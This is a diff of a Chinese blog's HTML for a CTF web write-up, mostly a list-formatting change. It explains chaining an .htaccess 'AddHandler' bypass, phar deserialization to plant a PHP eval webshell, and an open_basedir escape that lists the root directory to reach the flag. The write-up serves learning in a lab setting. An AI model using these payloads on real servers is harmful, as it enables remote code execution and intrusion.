@@ -37,20 +37,28 @@
 
 <p>这道题不得不说，真的是质量拉满，做的时候思路断了就畏惧了，这么有质量的题一点都没有用心做</p>
 <p>先反思一下，自己当时做的时候卡的地方：</p>
-<p>（1）<code>$this-&gt;checkext()</code>过滤了php后缀，有想到能上传<strong>.htaccess</strong>文件，但是代码：</p>
+<ul>
+<li><code>$this-&gt;checkext()</code>过滤了php后缀，有想到能上传<strong>.htaccess</strong>文件，但是代码：</li>
+</ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>对文件内容做了过滤，限制了<code>auto_prepend_file</code>，<code>php_value</code>，<code>&lt;?</code>，<code>set</code>等关键字，如果往htaccess中写入：</p>
 <p><code>SetHandler application/x-httpd-php</code>，会被直接过滤，所以这里的思路直接断了</p>
-<p>（2）发现了<code>file_get_contents($this-&gt;url,NULL,NULL,0,2048);</code>代码中<code>$this-&gt;url</code>参数可控，可以触发phar反序列化，触发后，可以执行<code>__destruct</code>中的写文件：<code>file_put_contents($this-&gt;filename.&quot;.txt&quot;, $string);</code>，但是后缀名限制是<code>.txt</code>，加上第一步思路卡住，不知道怎么写htaccess。思路又断了</p>
-<p>（3）另外还有个<code>__toString</code>，可以扫描目录，结合<code>__destruct</code>的<code>$string = &quot;your file in : &quot;.$this-&gt;userdir;</code>可以触发，也不知道怎么利用</p>
+<ul>
+<li>发现了<code>file_get_contents($this-&gt;url,NULL,NULL,0,2048);</code>代码中<code>$this-&gt;url</code>参数可控，可以触发phar反序列化，触发后，可以执行<code>__destruct</code>中的写文件：<code>file_put_contents($this-&gt;filename.&quot;.txt&quot;, $string);</code>，但是后缀名限制是<code>.txt</code>，加上第一步思路卡住，不知道怎么写htaccess。思路又断了</li>
+<li>另外还有个<code>__toString</code>，可以扫描目录，结合<code>__destruct</code>的<code>$string = &quot;your file in : &quot;.$this-&gt;userdir;</code>可以触发，也不知道怎么利用</li>
+</ul>
 <p>然后开始复现，解决如上三点卡住的方法：</p>
-<p>（1）对.htaccess的内容的绕过方法：</p>
+<ul>
+<li>对.htaccess的内容的绕过方法：</li>
+</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>
 
 <p>可以参考：<a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218495.html</a> </p>
-<p>（2）既然解决htaccess的内容问题，那么反序列化的利用就很简洁明了了，通过<code>file_put_contents</code>写入.txt后缀的文件，通过htaccess解析成php马</p>
-<p>（3）那么，做题的师傅应该都会有个疑问，既然我前面可以直接写马了，为什么题目还需要专门设置了一个显眼的魔术方法<code>__toString</code>呢，这个方法作用无非就是扫目录，但是服务器有直接返回给我们<code>upload/md5(ip)</code>这样的相对路径。既然这样，我们可以通过反序列化来改变参数如下：</p>
+<ul>
+<li>既然解决htaccess的内容问题，那么反序列化的利用就很简洁明了了，通过<code>file_put_contents</code>写入.txt后缀的文件，通过htaccess解析成php马</li>
+<li>那么，做题的师傅应该都会有个疑问，既然我前面可以直接写马了，为什么题目还需要专门设置了一个显眼的魔术方法<code>__toString</code>呢，这个方法作用无非就是扫目录，但是服务器有直接返回给我们<code>upload/md5(ip)</code>这样的相对路径。既然这样，我们可以通过反序列化来改变参数如下：</li>
+</ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userdir = <span class="string">'&lt;?php eval($_GET[cmd]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filename = <span class="string">"upload/4f105b2c0ec2da14aae9b130ee13f8e9/somnus"</span>;</span><br></pre></td></tr></table></figure>
 
 <p>不就能直接写入到<strong>upload/4f105b2c0ec2da14aae9b130ee13f8e9/somnus.txt</strong>了吗，其实这样不行的，大家测一下就知道了。</p>
@@ -92,7 +100,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
 
 <p><img src="../../../../img/d3/21.png" alt=""></p>
-<p>最后读取：*<em>F1aG_1s_H4r4 *</em></p>
+<p>最后读取：<strong>F1aG_1s_H4r4</strong></p>
 <p><img src="../../../../img/d3/22.png" alt=""></p>
 </div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/11/25/2019NJUPTctf-wp/"><span>2019 D^3 &amp;&amp; NJUPT ctf Web部分题解WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
 var verify = 'false' == true ? true : false;
